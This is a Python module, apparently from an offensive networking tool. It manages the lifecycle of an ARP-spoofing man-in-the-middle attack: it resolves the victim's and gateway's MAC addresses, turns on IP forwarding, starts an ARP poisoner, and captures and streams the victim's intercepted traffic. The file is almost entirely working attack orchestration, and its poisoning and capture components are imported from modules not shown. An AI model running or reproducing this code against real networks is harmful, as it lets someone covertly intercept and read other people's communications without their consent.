"""MITM lifecycle manager — the single source of truth for MITM state."""
from __future__ import annotations
import ipaddress
import logging
import platform
import queue
import subprocess
import threading
import time
from typing import Optional

from .. import network as net_mod
from . import arp, capture, forwarding
from .models import MitmSession, MitmState
from .stream import STREAM

log = logging.getLogger("mitm.manager")


def _get_gateway_linux() -> Optional[str]:
    try:
        out = subprocess.check_output(["ip", "route"], text=True, timeout=2)
        for line in out.splitlines():
            if line.startswith("default"):
                parts = line.split()
                if "via" in parts:
                    return parts[parts.index("via") + 1]
    except Exception as e:
        log.warning("gateway detection failed: %s", e)
    return None


class MitmManager:
    def __init__(self):
        self._lock = threading.RLock()
        self._session = MitmSession()
        self._poisoner: Optional[arp.ArpPoisoner] = None
        self._capturer: Optional[capture.PacketCapturer] = None
        self._queue: "queue.Queue" = queue.Queue(maxsize=10000)
        self._pump_thread: Optional[threading.Thread] = None
        self._pump_stop = threading.Event()
        self._forwarding_enabled_by_us = False

    # ------------------------------------------------------------------
    # Status
    # ------------------------------------------------------------------
    def get_status(self) -> dict:
        with self._lock:
            data = self._session.to_dict()
        data["paused"] = STREAM.is_paused()
        data["packet_count"] = len(STREAM.recent(limit=10**9))
        return data

    # ------------------------------------------------------------------
    # Start
    # ------------------------------------------------------------------
    def start(self, victim_ip: str, iface: Optional[str] = None) -> dict:
        with self._lock:
            if self._session.state in (MitmState.STARTING, MitmState.RUNNING, MitmState.STOPPING):
                return {"ok": False, "error": f"MITM is already {self._session.state.value}"}

            self._session = MitmSession(state=MitmState.STARTING)

        try:
            # 1) Validate victim IP is on our LAN
            primary = net_mod.get_primary()
            if not primary:
                raise RuntimeError("No active network interface found")

            chosen_iface = iface or primary["name"]
            attacker_ip = primary["ip"]
            attacker_mac = self._get_iface_mac(chosen_iface)
            if not attacker_mac:
                raise RuntimeError(f"Cannot determine MAC for interface {chosen_iface}")

            # 2) Victim + gateway reachability via ARP
            victim_mac = arp.get_mac(victim_ip, chosen_iface, timeout=2.0)
            if not victim_mac:
                raise RuntimeError(f"Victim {victim_ip} is not reachable via ARP")

            gateway_ip = _get_gateway_linux()
            if not gateway_ip:
                raise RuntimeError("Could not determine default gateway")

            gateway_mac = arp.get_mac(gateway_ip, chosen_iface, timeout=2.0)
            if not gateway_mac:
                raise RuntimeError(f"Gateway {gateway_ip} is not reachable via ARP")

            # 3) Sanity: victim and gateway on same subnet as us
            try:
                iface_net = ipaddress.ip_network(primary["cidr"], strict=False)
                for name, ip in (("victim", victim_ip), ("gateway", gateway_ip)):
                    if ipaddress.ip_address(ip) not in iface_net:
                        raise RuntimeError(f"{name.capitalize()} {ip} is not on {primary['cidr']}")
            except ValueError:
                pass

            with self._lock:
                self._session.victim_ip = victim_ip
                self._session.victim_mac = victim_mac
                self._session.gateway_ip = gateway_ip
                self._session.gateway_mac = gateway_mac
                self._session.attacker_iface = chosen_iface
                self._session.attacker_ip = attacker_ip
                self._session.attacker_mac = attacker_mac

            log.info("MITM target: victim=%s (%s) gateway=%s (%s) iface=%s",
                     victim_ip, victim_mac, gateway_ip, gateway_mac, chosen_iface)

            # 4) Forwarding
            if not forwarding.enable_forwarding(chosen_iface):
                raise RuntimeError("Could not enable IP forwarding (need root)")
            self._forwarding_enabled_by_us = True
            with self._lock:
                self._session.forwarded = True

            # 5) ARP poisoner
            self._poisoner = arp.ArpPoisoner(
                victim_ip=victim_ip, victim_mac=victim_mac,
                gateway_ip=gateway_ip, gateway_mac=gateway_mac,
                attacker_mac=attacker_mac, iface=chosen_iface,
            )
            self._poisoner.start()

            # 6) Capture
            STREAM.clear()
            self._capturer = capture.PacketCapturer(iface=chosen_iface, out_queue=self._queue)
            self._capturer.start()

            # 7) Pump thread — moves from queue to stream
            self._pump_stop.clear()
            self._pump_thread = threading.Thread(target=self._pump, daemon=True)
            self._pump_thread.start()

            with self._lock:
                self._session.state = MitmState.RUNNING
                self._session.started_at = time.time()
                self._session.error = None
                return {"ok": True, "session": self._session.to_dict()}

        except Exception as e:
            log.exception("MITM start failed")
            with self._lock:
                self._session.state = MitmState.ERROR
                self._session.error = str(e)
            self._cleanup(restore_arp=False)
            return {"ok": False, "error": str(e)}

    # ------------------------------------------------------------------
    # Stop
    # ------------------------------------------------------------------
    def stop(self) -> dict:
        with self._lock:
            if self._session.state == MitmState.STOPPED:
                return {"ok": True, "message": "Already stopped"}
            if self._session.state == MitmState.STOPPING:
                return {"ok": True, "message": "Already stopping"}
            self._session.state = MitmState.STOPPING
            session_snapshot = dict(self._session.to_dict())
            state_before = session_snapshot

        log.info("MITM stop requested")

        try:
            self._cleanup(restore_arp=True)
        except Exception as e:
            log.exception("Stop cleanup failed")
            with self._lock:
                self._session.error = str(e)

        with self._lock:
            self._session.state = MitmState.STOPPED
            self._session.stopped_at = time.time()
            data = self._session.to_dict()

        log.info("MITM stopped (victim=%s)", state_before.get("victim_ip"))
        return {"ok": True, "session": data}

    # ------------------------------------------------------------------
    # Pause / resume / clear
    # ------------------------------------------------------------------
    def pause(self) -> dict:
        STREAM.pause()
        return {"ok": True, "paused": True}

    def resume(self) -> dict:
        STREAM.resume()
        return {"ok": True, "paused": False}

    def clear_packets(self) -> dict:
        STREAM.clear()
        return {"ok": True}

    # ------------------------------------------------------------------
    # Helpers
    # ------------------------------------------------------------------
    def _get_iface_mac(self, iface: str) -> Optional[str]:
        """Read MAC of a network interface."""
        try:
            import fcntl
            import struct
            s = __import__("socket").socket(
                __import__("socket").AF_INET,
                __import__("socket").SOCK_DGRAM,
            )
            info = fcntl.ioctl(
                s.fileno(), 0x8927,
                struct.pack("256s", iface[:15].encode()),
            )
            return ":".join(f"{b:02X}" for b in info[18:24])
        except Exception as e:
            log.warning("MAC lookup failed for %s: %s", iface, e)
        return None

    def _pump(self) -> None:
        """Move records from the internal queue to the SSE stream."""
        while not self._pump_stop.is_set():
            try:
                rec = self._queue.get(timeout=0.5)
                STREAM.publish(rec)
            except queue.Empty:
                continue
            except Exception as e:
                log.debug("pump error: %s", e)

    def _cleanup(self, restore_arp: bool) -> None:
        """Stop capture, stop ARP, restore state, disable forwarding."""
        # 1) Capture
        if self._capturer:
            try:
                self._capturer.stop()
                self._capturer.join(timeout=3.0)
            except Exception:
                pass
            self._capturer = None

        # 2) Pump
        self._pump_stop.set()
        if self._pump_thread:
            try:
                self._pump_thread.join(timeout=2.0)
            except Exception:
                pass
            self._pump_thread = None

        # 3) ARP poisoner (restore inside run() at end)
        if self._poisoner:
            try:
                self._poisoner.stop()
                self._poisoner.join(timeout=5.0)
            except Exception:
                pass
            self._poisoner = None

        # 4) Forwarding
        if self._forwarding_enabled_by_us:
            iface = None
            with self._lock:
                iface = self._session.attacker_iface
            if iface:
                forwarding.disable_forwarding(iface)
            self._forwarding_enabled_by_us = False
            with self._lock:
                self._session.forwarded = False

        # 5) Drain internal queue
        try:
            while True:
                self._queue.get_nowait()
        except queue.Empty:
            pass


# ---------- global singleton ----------
_manager_lock = threading.Lock()
_manager: Optional[MitmManager] = None


def get_manager() -> MitmManager:
    global _manager
    with _manager_lock:
        if _manager is None:
            _manager = MitmManager()
        return _manager